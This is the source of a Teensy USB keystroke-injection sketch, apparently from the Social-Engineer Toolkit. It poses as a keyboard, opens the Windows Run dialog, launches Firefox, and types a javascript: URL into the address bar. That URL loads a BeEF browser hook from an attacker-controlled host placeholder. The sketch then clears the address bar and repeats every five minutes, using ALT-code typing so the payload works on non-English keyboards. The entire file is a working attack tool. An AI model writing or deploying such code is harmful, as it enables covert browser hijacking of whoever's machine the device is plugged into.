//
// Social-Engineer Toolkit Teensy Attack Vector
// Written by: Dave Kennedy (ReL1K) and Josh Kelley (WinFaNG)
//
// Special thanks to: Garland for writing this beef plugin
//
// 2011-02-28 padzero@gmail.com
// * Added "ALT code" print function (ascii_*): Fixed payload execution on non-english keymap targets
// * Change hotkey for jump to location bar from <ALT><D> to <F6>: Attempt to make payload fully functioning on non-english browsers
// * Added start of browser: WTF
//

#define TYPESPEED 17
#define send_alt_d() send_keys(KEY_D, MODIFIERKEY_ALT)
#define send_enter() send_keys(KEY_ENTER, 0)
#define send_delete() send_keys(KEY_DELETE, 0)
#define send_esc() send_keys(KEY_ESC, 0)
#define send_tab() send_keys(KEY_TAB, 0);
#define send_windows_r() send_keys(KEY_R, MODIFIERKEY_GUI);
#define send_f6() send_keys(KEY_F6, 0);

char attack_string[] = "javascript:void(function(){var hi = document.getElementsByTagName(\"head\")[0]; "
                       "var ns = document.createElement('script'); ns.type = 'text/javascript'; ns.src = 'http://IPADDR/beef/hook/beefmagic.js.php'; "
                       "hi.appendChild(ns);}());";

char convert[4] = "000"; // do not change this

void ascii_type_this(char *string)
{
  int count, length;
  length = strlen(string);
  for(count = 0 ; count < length ; count++)
  {
    char a = string[count];
    ascii_input(ascii_convert(a));
  }
}

void ascii_input(char *string)
{
  if (string == "000") return;
  int count, length;
  length = strlen(string);
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.send_now();
  for(count = 0 ; count < length ; count++)
  {
    char a = string[count];
    if (a == '1') Keyboard.set_key1(KEYPAD_1);
    if (a == '2') Keyboard.set_key1(KEYPAD_2);
    if (a == '3') Keyboard.set_key1(KEYPAD_3);
    if (a == '4') Keyboard.set_key1(KEYPAD_4);
    if (a == '5') Keyboard.set_key1(KEYPAD_5);
    if (a == '6') Keyboard.set_key1(KEYPAD_6);
    if (a == '7') Keyboard.set_key1(KEYPAD_7);
    if (a == '8') Keyboard.set_key1(KEYPAD_8);
    if (a == '9') Keyboard.set_key1(KEYPAD_9);
    if (a == '0') Keyboard.set_key1(KEYPAD_0);
    Keyboard.send_now();
    Keyboard.set_key1(0);
    delay(11);
    Keyboard.send_now();
  }
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

char* ascii_convert(char string)
{
  if (string == 'T') return "84";
  if (string == ' ') return "32";
  if (string == '!') return "33";
  if (string == '\"') return "34";
  if (string == '#') return "35";
  if (string == '$') return "36";
  if (string == '%') return "37";
  if (string == '&') return "38";
  if (string == '\'') return "39";
  if (string == '(') return "40";
  if (string == ')') return "41";
  if (string == '*') return "42";
  if (string == '+') return "43";
  if (string == ',') return "44";
  if (string == '-') return "45";
  if (string == '.') return "46";
  if (string == '/') return "47";
  if (string == '0') return "48";
  if (string == '1') return "49";
  if (string == '2') return "50";
  if (string == '3') return "51";
  if (string == '4') return "52";
  if (string == '5') return "53";
  if (string == '6') return "54";
  if (string == '7') return "55";
  if (string == '8') return "56";
  if (string == '9') return "57";
  if (string == ':') return "58";
  if (string == ';') return "59";
  if (string == '<') return "60";
  if (string == '=') return "61";
  if (string == '>') return "62";
  if (string == '?') return "63";
  if (string == '@') return "64";
  if (string == 'A') return "65";
  if (string == 'B') return "66";
  if (string == 'C') return "67";
  if (string == 'D') return "68";
  if (string == 'E') return "69";
  if (string == 'F') return "70";
  if (string == 'G') return "71";
  if (string == 'H') return "72";
  if (string == 'I') return "73";
  if (string == 'J') return "74";
  if (string == 'K') return "75";
  if (string == 'L') return "76";
  if (string == 'M') return "77";
  if (string == 'N') return "78";
  if (string == 'O') return "79";
  if (string == 'P') return "80";
  if (string == 'Q') return "81";
  if (string == 'R') return "82";
  if (string == 'S') return "83";
  if (string == 'T') return "84";
  if (string == 'U') return "85";
  if (string == 'V') return "86";
  if (string == 'W') return "87";
  if (string == 'X') return "88";
  if (string == 'Y') return "89";
  if (string == 'Z') return "90";
  if (string == '[') return "91";
  if (string == '\\') return "92";
  if (string == ']') return "93";
  if (string == '^') return "94";
  if (string == '_') return "95";
  if (string == '`') return "96";
  if (string == 'a') return "97";
  if (string == 'b') return "98";
  if (string == 'c') return "99";
  if (string == 'd') return "100";
  if (string == 'e') return "101";
  if (string == 'f') return "102";
  if (string == 'g') return "103";
  if (string == 'h') return "104";
  if (string == 'i') return "105";
  if (string == 'j') return "106";
  if (string == 'k') return "107";
  if (string == 'l') return "108";
  if (string == 'm') return "109";
  if (string == 'n') return "110";
  if (string == 'o') return "111";
  if (string == 'p') return "112";
  if (string == 'q') return "113";
  if (string == 'r') return "114";
  if (string == 's') return "115";
  if (string == 't') return "116";
  if (string == 'u') return "117";
  if (string == 'v') return "118";
  if (string == 'w') return "119";
  if (string == 'x') return "120";
  if (string == 'y') return "121";
  if (string == 'z') return "122";
  if (string == '{') return "123";
  if (string == '|') return "124";
  if (string == '}') return "125";
  if (string == '~') return "126";
  Keyboard.print(string);
  return "000";
}

void release_keys()
{
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(100);
}

void send_keys(byte key, byte modifier)
{
  if(modifier)
    Keyboard.set_modifier(modifier);
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(100);
  release_keys();   
}

void setup()
{
  delay(1000 * 20); // Wait 20 seconds...
}



void loop()
{
  int counter;
  send_windows_r();
  ascii_type_this("firefox.exe"); // iexplore.exe or firefox.exe or chrome.exe
  send_enter();
  delay(5000); // Wait 5 seconds...
  send_f6();
  ascii_type_this(attack_string);
  send_enter();
  delay(3000); // Wait 3 seconds...
  send_f6(); // Could not figure out a multilingual shortcut for the location bar that works with all browsers
  send_delete(); // (CTRL+L works with FF & Chrome, F4 for IE)
  send_f6(); // Workaround: 3x <F6> <DEL>
  send_delete();
  send_f6();
  send_delete();
 
  // Wait 5 minutes...
  for(counter = 0; counter < 60 * 5; counter++) 
    delay(1000);
}
